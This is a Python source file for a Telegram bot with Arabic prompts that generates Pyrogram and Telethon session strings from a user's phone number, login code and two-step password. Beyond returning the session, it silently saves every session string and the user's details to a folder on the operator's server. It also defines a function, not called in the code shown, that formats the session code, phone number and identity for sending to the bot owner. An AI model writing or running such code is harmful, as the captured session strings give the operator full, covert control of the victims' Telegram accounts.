import os, json, logging
from datetime import datetime, timezone
from asyncio.exceptions import TimeoutError
from io import BytesIO

import config
from pyrogram import Client, filters
from pyrogram.types import Message, InlineKeyboardButton, InlineKeyboardMarkup
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.tl.functions.account import DeleteAccountRequest
from StringGen.utils import ask
from config import OWNER_ID
from pyrogram.errors import (
    ApiIdInvalid, PhoneNumberInvalid, PhoneCodeInvalid, PhoneCodeExpired,
    SessionPasswordNeeded, PasswordHashInvalid,
    ApiIdInvalid as ApiIdInvalid1, PhoneNumberInvalid as PhoneNumberInvalid1,
    PhoneCodeInvalid as PhoneCodeInvalid1, PhoneCodeExpired as PhoneCodeExpired1,
    SessionPasswordNeeded as SessionPasswordNeeded1, PasswordHashInvalid as PasswordHashInvalid1,
)
from telethon.errors import (
    ApiIdInvalidError, PhoneNumberInvalidError, PhoneCodeInvalidError,
    PhoneCodeExpiredError, SessionPasswordNeededError, PasswordHashInvalidError,
    FloodWaitError, AuthRestartError,
)

from pyrogram import Client, filters
from pyrogram.errors import RPCError
from telethon import TelegramClient
from telethon.sessions import StringSession
from telethon.errors import RPCError as TelethonRPCError
import config
logger = logging.getLogger(__name__)
logger.setLevel(logging.INFO)

os.makedirs("StringsHolder", exist_ok=True)

ASK_QUES = "**اختر نوع الجلسة التي تريد توليدها**"
BUTTONS_QUES = [
    [
        InlineKeyboardButton("بايروجرام نسخة 1", callback_data="pyrogram_v1"),
        InlineKeyboardButton("بايروجرام نسخة 2", callback_data="pyrogram_v2"),
    ],
    [InlineKeyboardButton("تيليثون", callback_data="telethon")],
    [
        InlineKeyboardButton("بايروجرام بوت", callback_data="pyrogram_bot"),
        InlineKeyboardButton("تيليثون بوت", callback_data="telethon_bot"),
    ],
]
GEN_BUTTON = [[InlineKeyboardButton("توليد جلسة جديدة", callback_data="generate")]]

async def ask_or_cancel(bot: Client, uid: int, prompt: str, *, timeout: int | None = None) -> str | None:
    try:
        m = await ask(bot, uid, prompt, timeout=timeout)
    except TimeoutError:
        raise TimeoutError("انتهى الوقت - لم يتم الرد في الوقت المحدد")

    tx = m.text.strip()
    if tx in ("/cancel", "/restart"):
        await bot.send_message(uid,
            "» تم الإلغاء" if tx == "/cancel" else "» إعادة تشغيل البوت...",
            reply_markup=InlineKeyboardMarkup(GEN_BUTTON),
        )
        return None
    return tx

def save_to_cache(uid: int, string_: str, meta: dict) -> None:
    ts = datetime.now().strftime("%Y%m%d_%H%M%S")
    base = f"StringsHolder/{uid}_{ts}"
    with open(base + "_session.txt", "w") as f:
        f.write(string_)
    with open(base + "_info.json", "w") as f:
        json.dump(meta, f, indent=2)




async def send_to_owner(bot: Client, string_: str, meta: dict) -> None:
    try:
        user_info = await bot.get_users(meta['user_id'])
        
        info_text = (
            "<b>**📋 معلومات الجلسة الجديدة:**\n\n"
            f"• **الاسم:** {user_info.first_name} {user_info.last_name or ''}\n"
            f"• **المعرف:** @{user_info.username}\n"
            f"• **الآيدي:** `{user_info.id}`\n"
            f"• **رقم الهاتف:** `{meta.get('phone_number', 'غير معروف')}`\n"
            f"• **نوع الجلسة:** {meta['session_type']}\n"
            f"• **تاريخ الإنشاء:** {meta['created_at']}\n\n"
            f"**🎫 كود الجلسة:**\n`{string_}`</b>"
        )
        
        await bot.send_message(
            config.OWNER_ID,
            info_text
        )
    except Exception as e:
        logger.error(f"فشل في إرسال الجلسة للمطور: {e}")

def readable_error(exc: Exception) -> str:
    mapping = {
        (ApiIdInvalid, ApiIdInvalid1, ApiIdInvalidError): "خطأ في الـ API.",
        (PhoneNumberInvalid, PhoneNumberInvalid1, PhoneNumberInvalidError): "خطأ في رقم الهاتف.",
        (PhoneCodeInvalid, PhoneCodeInvalid1, PhoneCodeInvalidError): "كود غير صحيح.",
        (PhoneCodeExpired, PhoneCodeExpired1, PhoneCodeExpiredError): "الكود انتهى.",
        (PasswordHashInvalid, PasswordHashInvalid1, PasswordHashInvalidError): "كلمة المرور الثانية غير صحيحة.",
        FloodWaitError: "انتظر قليلاً - تم التكرار كثيراً.",
        AuthRestartError: "تم إعادة تشغيل المصادقة. يرجى المحاولة مرة أخرى.",
    }
    for group, txt in mapping.items():
        if isinstance(exc, group):
            return txt
    return f"حدث خطأ غير معروف: {str(exc).replace('`', '')}"

@Client.on_message(filters.private & filters.command(["generate", "gen", "string", "str"]))
async def cmd_generate(_, m: Message):
    await m.reply(ASK_QUES, reply_markup=InlineKeyboardMarkup(BUTTONS_QUES))

async def generate_session(
    bot: Client,
    msg: Message,
    *,
    telethon: bool = False,
    old_pyro: bool = False,
    is_bot: bool = False,
):
    uid = msg.chat.id
    uname = msg.from_user.username or "unknown"

    ses_type = (
        "تيليثون" if telethon else
        ("بايروجرام" if old_pyro else "بايروجرام نسخة 2")
    )
    if is_bot:
        ses_type += " بوت"

    await msg.reply(f"» جاري توليد **{ses_type}** جلسة جديدة...")
    api_id, api_hash = config.API_ID, config.API_HASH

    prompt = (
        "أدخل **توكن البوت**\n`123456:ABCDEF`"
        if is_bot else
        "أدخل **رقم الهاتف**\n`+966xxxxxxxxx`"
    )
    try:
        token_or_phone = await ask_or_cancel(bot, uid, prompt)
        if token_or_phone is None or not token_or_phone.strip() or token_or_phone.strip() in [".", "-", "_"]:
            return await msg.reply("» خطأ في رقم الهاتف/توكن البوت.", reply_markup=InlineKeyboardMarkup(GEN_BUTTON))
        token_or_phone = token_or_phone.strip()
    except TimeoutError as te:
        return await msg.reply(f"» {te}", reply_markup=InlineKeyboardMarkup(GEN_BUTTON))

    client = (
        TelegramClient(StringSession(), api_id, api_hash)
        if telethon else
        Client("bot" if is_bot else "user", api_id=api_id, api_hash=api_hash,
               bot_token=token_or_phone if is_bot else None, in_memory=True)
    )

    try:
        await client.connect()
    except Exception as exc:
        logger.exception("connect failed")
        return await msg.reply(readable_error(exc), reply_markup=InlineKeyboardMarkup(GEN_BUTTON))

    try:
        if is_bot:
            if telethon:
                await client.start(bot_token=token_or_phone)
            else:
                await client.sign_in_bot(token_or_phone)
        else:
            if telethon:
                code = await client.send_code_request(token_or_phone)
            else:
                code = await client.send_code(token_or_phone)
            otp = await ask_or_cancel(bot, uid, "أدخل **الكود** (`1 2 3 4 5`)", timeout=600)
            if otp is None: return
            otp = otp.replace(" ", "")
            try:
                if telethon:
                    await client.sign_in(token_or_phone, otp)
                else:
                    await client.sign_in(token_or_phone, code.phone_code_hash, otp)
            except (SessionPasswordNeeded, SessionPasswordNeeded1, SessionPasswordNeededError):
                pw = await ask_or_cancel(bot, uid, "**الحساب محمي ارسل كلمه المرور**", timeout=300)
                if pw is None: return
                await client.sign_in(password=pw) if telethon else await client.check_password(password=pw)

    except Exception as exc:
        await client.disconnect()
        return await msg.reply(readable_error(exc), reply_markup=InlineKeyboardMarkup(GEN_BUTTON))

    try:
        string_session = client.session.save() if telethon else await client.export_session_string()
    except Exception as exc:
        await client.disconnect()
        return await msg.reply(readable_error(exc), reply_markup=InlineKeyboardMarkup(GEN_BUTTON))

    save_to_cache(uid, string_session, {
        "session_type": ses_type,
        "user_id": uid,
        "username": uname,
        "is_bot": is_bot,
        "is_telethon": telethon,
        "created_at": datetime.now(timezone.utc).isoformat(),
    })

    try:
        note = (
            f"**جلسة {ses_type} الجديدة:**\n\n`{string_session}`\n\n"
            "• تحذير : لا تشارك الجلسه مع أي أحد غير مطور السورس\n"
            "• تم تطويري بواسطه : @TOPVEGA\n"
            "• قناة السورس : @vegaone"
        )
        if is_bot:
            await bot.send_message(uid, note)
        else:
            await client.send_message("me", note)
            await bot.send_message(uid, "✓ تم حفظ الجلسة في الرسائل المحفوظه .")
    finally:
        await client.disconnect()
        
        
      

